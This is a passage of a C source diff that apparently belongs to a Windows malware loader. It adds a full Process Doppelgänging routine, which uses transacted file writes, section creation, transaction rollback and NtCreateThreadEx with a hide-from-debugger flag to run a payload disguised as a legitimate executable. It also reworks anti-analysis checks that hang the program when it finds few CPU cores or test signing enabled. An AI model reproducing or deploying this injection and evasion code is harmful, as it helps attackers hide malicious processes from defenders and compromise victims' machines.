 	int x = 0;
-	__asm{
-	mov x,ebx
-		}
+
 	return x;
 }
 void CheckCoreCount(void)
@@ -1575,10 +1746,7 @@ void CheckCoreCount(void)
 	}
 	if(result < 2)
 	{
-		__asm{
- db 0xEB 
- db 0xFE 
- }
+jumptoself_ASM();
 	}
 	else{
 		return;
@@ -1616,12 +1784,335 @@ void testsigning(void)
     	BOOL bTestsigningEnabled = !!(sci.CodeIntegrityOptions & 0x2); // CODEINTEGRITY_OPTION_TESTSIGN
 		if(bTestsigningEnabled)
 		{
-			__asm{
- db 0xEB 
- db 0xFE 
- }
+	jumptoself_ASM();
 		}
 	}
+}
+void ProcessDoppelgänging(LPWSTR lpTargetApp, LPWSTR lpPayloadApp)
+{
+	HINSTANCE hinstStub = GetModuleHandle("ntdll.dll");
+	if(hinstStub) 
+	{
+		NtCreateTransaction = (LPNTCREATETRANSACTION)GetProcAddress(hinstStub, "NtCreateTransaction");
+		NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtAllocateVirtualMemory");
+		NtCreateSection = (LPNTCREATESECTION)GetProcAddress(hinstStub, "NtCreateSection");
+		NtRollbackTransaction = (LPNTROLLBACKTRANSACTION)GetProcAddress(hinstStub, "NtRollbackTransaction");
+		NtClose = (LPNTCLOSE)GetProcAddress(hinstStub, "NtClose");
+		NtCreateProcessEx = (LPNTCREATEPROCESSEX)GetProcAddress(hinstStub, "NtCreateProcessEx");
+		NtQueryInformationProcess = (LPNTQUERYINFORMATIONPROCESS)GetProcAddress(hinstStub, "NtQueryInformationProcess");
+		NtReadVirtualMemory = (LPNTREADVIRTUALMEMORY)GetProcAddress(hinstStub, "NtReadVirtualMemory");
+		NtWriteVirtualMemory = (LPNTWRITEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtWriteVirtualMemory");
+		NtCreateThreadEx = (LPNTCREATETHREADEX)GetProcAddress(hinstStub, "NtCreateThreadEx");
+		NtFreeVirtualMemory = (LPNTFREEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtFreeVirtualMemory");
+		RtlCreateProcessParametersEx = (LPRTLCREATEPROCESSPARAMETERSEX)GetProcAddress(hinstStub, "RtlCreateProcessParametersEx");
+		RtlDestroyProcessParameters = (LPRTLDESTROYPROCESSPARAMETERS)GetProcAddress(hinstStub, "RtlDestroyProcessParameters");
+		RtlImageNtHeader = (LPRTLIMAGENTHEADER)GetProcAddress(hinstStub, "RtlImageNtHeader");
+		RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, "RtlInitUnicodeString");
+
+	}
+	else
+	{
+		exit(0);
+	}
+		
+	BOOL bCond = FALSE;
+    NTSTATUS status;
+    HANDLE hTransaction = NULL, hTransactedFile = INVALID_HANDLE_VALUE, hFile = INVALID_HANDLE_VALUE;
+    HANDLE hSection = NULL, hProcess = NULL, hThread = NULL;
+    LARGE_INTEGER fsz;
+    ULONG ReturnLength = 0;
+    ULONG_PTR EntryPoint = 0; //, ImageBase = 0;
+    PVOID Buffer = NULL, MemoryPtr = NULL;
+    SIZE_T sz = 0;
+    PEB *Peb;
+
+    PROCESS_BASIC_INFORMATION pbi;
+
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
+
+    OBJECT_ATTRIBUTES obja;
+    UNICODE_STRING    ustr;
+ 	//RtlInitUnicodeString(&ustr, L"C:\\windows\\system32\\svchost.exe");
+	//wchar_t* tempholder = L"";
+	//wcstombs(lpTargetApp,tempholder,256);
+    RtlInitUnicodeString(&ustr, lpTargetApp);
+	//RtlInitUnicodeString(&ustr, L"fuck it"); // find and replace here random string between 8 and 20 chars <-- I'm a god damned moron.
+
+    BYTE temp[0x1000];
+
+    do {
+        RtlSecureZeroMemory(&temp, sizeof(temp));
+        //
+        // Create TmTx transaction object.
+        //
+        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
+        status = NtCreateTransaction(&hTransaction,
+            TRANSACTION_ALL_ACCESS,
+            &obja,
+            NULL,
+            NULL,
+            0,
+            0,
+            0,
+            NULL,
+            &ustr);
+
+        if (!NT_SUCCESS(status)) {
+            //printf("NtCreateTransaction fail\n");
+            break;
+        }
+        //
+        // Open target file for transaction.
+        //
+        hTransactedFile = CreateFileTransactedW(lpTargetApp,
+            GENERIC_WRITE | GENERIC_READ,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL,
+            hTransaction,
+            NULL,
+            NULL);
+
+        if (hTransactedFile == INVALID_HANDLE_VALUE) {
+            //printf("CreateFileTransacted fail with GetLastError: %d\n",GetLastError());
+            break;
+        }
+        //
+        // Open file payload.
+        //
+        hFile = CreateFileW(lpPayloadApp,
+            GENERIC_READ,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+       //     printf("CreateFile(target) failed\n");
+            break;
+        }
+        //
+        // Query payload file size.
+        //
+        if (!GetFileSizeEx(hFile, &fsz)) {
+      //      printf("GetFileSizeEx failed\n");
+            break;
+        }
+        //
+        // Allocate buffer for payload file.
+        //
+        Buffer = NULL;
+        sz = (SIZE_T)fsz.LowPart;
+        status = NtAllocateVirtualMemory(NtCurrentProcess(),
+            &Buffer,
+            0,
+            &sz,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE);
+
+        if (!NT_SUCCESS(status)) {
+	//		printf("NtAllocateVirtualMemory failed\n");
+            break;
+        }
+
+        //
+        // Read payload file to the buffer.
+        //
+        if (!ReadFile(hFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
+      //      printf("ReadFile failed\n");
+            break;
+        }
+
+        CloseHandle(hFile);
+        hFile = INVALID_HANDLE_VALUE;
+        //
+        // Write buffer into transaction.
+        //
+        if (!WriteFile(hTransactedFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
+      //      printf("WriteFile failed\n");
+            break;
+        }
+        //
+        // Create section from transacted file.
+        //
+        status = NtCreateSection(&hSection,
+            SECTION_ALL_ACCESS,
+            NULL,
+            0,
+            PAGE_READONLY,
+            SEC_IMAGE,
+            hTransactedFile);
+        if (!NT_SUCCESS(status)) {
+            printf("NtCreateSection(hTransactedFile) failed\n");
+            break;
+        }
+
+        status = NtRollbackTransaction(hTransaction, TRUE);
+        if (!NT_SUCCESS(status)) {
+        //    printf("NtRollbackTransaction(hTransaction) failed\n");
+            break;
+        }
+
+        NtClose(hTransaction);
+        hTransaction = NULL;
+
+        CloseHandle(hTransactedFile);
+        hTransactedFile = INVALID_HANDLE_VALUE;
+        //
+        // Create process object with transacted section.
+        //
+        //
+        // Warning: due to MS brilliant coding skills (NULL ptr dereference) 
+        //          this call will trigger BSOD on Windows 10 prior to RS3.
+        //
+        hProcess = NULL;
+        status = NtCreateProcessEx(&hProcess,
+            GENERIC_ALL,
+            NULL,
+            GetCurrentProcess(),
+            PS_INHERIT_HANDLES,
+            hSection,
+            NULL,
+            NULL,
+            FALSE);
+
+        if (!NT_SUCCESS(status)) {
+            printf("NtCreateProcessEx(hSection) failed\n"); // fails with 0x4000000E /  STATUS_IMAGE_MACHINE_TYPE_MISMATCH
+			// maybe this only works with 64 bit?
+			
+
+
+            break;
+        }
+        //
+        // Query payload file entry point value.
+        //
+        status = NtQueryInformationProcess(hProcess,
+            ProcessBasicInformation,
+            &pbi,
+            sizeof(PROCESS_BASIC_INFORMATION),
+            &ReturnLength);
+
+        if (!NT_SUCCESS(status)) {
+        //    printf("NtQueryInformationProcess failed\n");
+            break;
+        }
+
+        status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &temp, 0x1000, &sz);
+        if (!NT_SUCCESS(status)) {
+         //   printf("NtReadVirtualMemory failed\n");
+            break;
+        }
+
+//      EntryPoint = (ULONG_PTR)RtlImageNtHeader(Buffer)->OptionalHeader.AddressOfEntryPoint;
+        EntryPoint = (RtlImageNtHeader(Buffer))->OptionalHeader.AddressOfEntryPoint;
+		EntryPoint += (ULONG_PTR)((PPEB)temp)->ImageBaseAddress;
+        //
+        // Create process parameters block.
+        //
+        //RtlInitUnicodeString(&ustr, L"C:\\windows\\system32\\svchost.exe");
+        //RtlInitUnicodeString(&ustr, lpTargetApp);
+        status = RtlCreateProcessParametersEx(&ProcessParameters,
+            &ustr,
+            NULL,
+            NULL,
+            &ustr,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            RTL_USER_PROC_PARAMS_NORMALIZED);
+
+        if (!NT_SUCCESS(status)) {
+           // printf("RtlCreateProcessParametersEx failed\n");
+            break;
+        }
+        //
+        // Allocate memory in target process and write process parameters block.
+        //
+        sz = ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength;
+        MemoryPtr = ProcessParameters;
+        status = NtAllocateVirtualMemory(hProcess,
+            &MemoryPtr,
+            0,
+            &sz,
+            MEM_RESERVE | MEM_COMMIT,
+            PAGE_READWRITE);
+
+        if (!NT_SUCCESS(status)) {
+           // printf("NtAllocateVirtualMemory(ProcessParameters) failed\n");
+            break;
+        }
+        sz = 0;
+        status = NtWriteVirtualMemory(hProcess,
+            ProcessParameters,
+            ProcessParameters,
+            ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength,
+            &sz);
+
+        if (!NT_SUCCESS(status)) {
+          //  printf("NtWriteVirtualMemory(ProcessParameters) failed\n");
+            break;
+        }
+        //
+        // Update PEB->ProcessParameters pointer to newly allocated block.
+        //
+        Peb = (PEB *)pbi.PebBaseAddress;
+        status = NtWriteVirtualMemory(hProcess,
+            &Peb->ProcessParameters,
+            &ProcessParameters,
+            sizeof(PVOID),
+            &sz);
+        if (!NT_SUCCESS(status)) {
+          //  printf("NtWriteVirtualMemory(Peb->ProcessParameters) failed\n");
+            break;
+        }
+        //
+        // Create primary thread.
+        //
+        hThread = NULL;
+		// fuck https://ntquery.wordpress.com/2014/03/29/anti-debug-ntcreatethreadex/#more-11
+		// #define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
+        status = NtCreateThreadEx(&hThread,
+            THREAD_ALL_ACCESS,
+            NULL,
+            hProcess,
+            (LPTHREAD_START_ROUTINE)EntryPoint,
+            NULL,
+            0x00000004,
+            0,
+            0,
+            0,
+            NULL);
+        if (!NT_SUCCESS(status)) {
+         //   printf("NtCreateThreadEx(EntryPoint) failed\n");
+            break;
+        }
+
+    } while (bCond);
+
+    if (hTransaction)
+        NtClose(hTransaction);
+    if (hSection)
+        NtClose(hSection);
+    if (hProcess)
+        NtClose(hProcess);
+    if (hThread)
+        NtClose(hThread);
+    if (hTransactedFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hTransactedFile);
+    if (hFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hFile);
+    if (Buffer != NULL) {
+        sz = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &sz, MEM_RELEASE);
+    }
+    if (ProcessParameters) {
+        RtlDestroyProcessParameters(ProcessParameters);
+    }
 }
 
 /* possibly use this for verifying sleep took place. Maybe add later.
